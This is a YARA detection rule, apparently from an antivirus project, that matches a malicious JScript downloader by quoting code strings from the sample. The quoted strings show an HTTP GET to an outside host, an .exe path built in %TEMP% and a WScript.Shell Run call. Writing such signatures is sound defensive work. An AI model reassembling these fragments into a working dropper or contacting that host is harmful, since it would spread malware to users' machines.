rule sig_20160329_84451fe38aa56cbbce31efef805a6502 {
  meta:
    description = "datamaliciousorder - file 20160329_84451fe38aa56cbbce31efef805a6502.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "56198e1480690a0e272852f1feee52150dd8f04ad03e81767b13087f716c5eb9"

  strings:
    $s1  = "aQ[ZV](\"GET\", \"http://digimacro.com.br/m8isda\", false);" fullword ascii
    $s2  = "function lg() {return qs[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"9yi4zPye9zftT.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[t](j() * 11); if (aQ[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function Gg(B, Tr){qJ = qJ * 1; return B - Tr;};" fullword ascii
    $s5  = "var qs = function RM() {return WScript[nn](\"WScript.Shell\");}(), P = 11;" fullword ascii
    $s6  = "function I(){return \"\" + h;};" fullword ascii
    $s7  = "function w(Su){qs[\"Run\"](Su, qJ, qJ);};" fullword ascii
    $s8  = "function QL() {return ((nU == true) && (nU == pI)) ? 1 : qJ;};" fullword ascii
    $s9  = "function A()" fullword ascii
    $s10 = " while (q){" fullword ascii
    $s11 = "function j(){return 22;};" fullword ascii
    $s12 = "function Yk(){return nn;};" fullword ascii
    $s13 = "return Gg(NR, X);" fullword ascii
    $s14 = "var uq = new this[\"Date\"]();" fullword ascii
    $s15 = "function m(Ds) {var b = (1, 2, 3, 4, 5, Ds); return b;};" fullword ascii
    $s16 = "var t0 = false;" fullword ascii
    $s17 = "var nU = false;" fullword ascii
    $s18 = "var pI = false;" fullword ascii
    $s19 = "nU = true; " fullword ascii
    $s20 = "pI = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}